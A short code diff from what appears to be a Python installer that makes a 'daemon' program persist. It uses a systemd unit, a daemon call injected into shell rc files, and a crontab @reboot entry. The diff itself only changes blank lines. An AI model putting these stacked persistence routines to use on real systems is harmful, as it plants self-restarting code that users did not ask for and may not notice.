@@ -53,7 +53,6 @@ WantedBy=multi-user.target'''.format(variables.daemon_path)
     os.system(commands)
 
 
-
 def bashrcs():
     alias = "alias 'daemon'='{}';\n".format(variables.daemon_path)
     daemon = "daemon;\n"
@@ -69,6 +68,7 @@ def bashrcs():
                 f.write(daemon)
         except:
             pass            
+
 
 def crontab():
     command = '''(crontab -l 2>/dev/null; echo "@reboot {}") | crontab -'''.format(variables.daemon_path)
